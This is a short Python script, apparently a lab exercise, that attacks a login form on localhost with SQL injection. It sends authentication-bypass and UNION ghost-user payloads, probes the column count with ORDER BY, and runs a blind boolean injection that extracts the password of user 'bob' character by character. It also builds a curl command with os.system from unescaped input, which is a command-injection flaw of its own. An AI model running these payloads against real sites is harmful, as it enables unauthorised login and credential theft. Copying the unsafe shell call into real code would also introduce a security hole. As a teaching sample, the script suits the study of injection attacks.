import os
import requests
import string

# FORMATED AS
# curl --data "uname=asdf&pword=asdf" http://localhost:8000/

HOST = "http://localhost:8000/"
COMMAND = "curl --data \"uname=%s&pword=%s\" %s"

def inject(query):
    os.system(COMMAND % (query, "pass", HOST))

def order_by_attack():
    counter = 1
    QUERY = "\' OR 1=1 ORDER BY %d LIMIT 1 -- "
    while True:
        req = requests.post(HOST, {
                "uname": QUERY % (counter),
                "pword": "asdf"
            })
        print req.text
        if "oh my you logged in" not in req.text:
            break
        counter += 1
    print counter - 1

def blind_attack():
    charset = string.ascii_letters + "_ "
    pass_length = 0
    # Get password length
    QUERY = "\' UNION SELECT * FROM users WHERE uname=\"bob\" AND LENGTH(pword) > %d -- "
    while True:
        req = requests.post(HOST, {
                "uname": QUERY % (pass_length),
                "pword": "asdf"
            })
        if "oh my you logged in" not in req.text:
            break
        pass_length += 1
    print pass_length

    password = "a"
    char_index = 1
    QUERY = "\' UNION SELECT * FROM users WHERE uname=\"bob\" AND pword LIKE \'%s%%\' -- "
    while True:
        if len(password) > pass_length:
            break
        req = requests.post(HOST, {
                "uname": QUERY % (password),
                "pword": "asdf"
            })
        if "oh my you logged in" in req.text:
            password += "a"
            char_index = 1
            continue
        password = password[:-1] + charset[char_index]
        char_index += 1
    print password[:-1]

print("INJECTING A FAILED INJECTION \n")
inject("bob")

print("\n\n\n")
print("INJECTING A SUCCESSFUL INJECTION \n")
inject("\' OR 1=1 LIMIT 1 -- ")

print("\n\n\n")
print("INJECTING A GHOST USER \n")
inject("\' UNION SELECT \'fake\', \'fake\' LIMIT 1 -- ")

print("\n\n\n")
print("RUNNING ORDER BY ATTACK \n")
order_by_attack()

print("\n\n\n")
print("RUNNING FIELD LENGTH GET \n")
blind_attack()

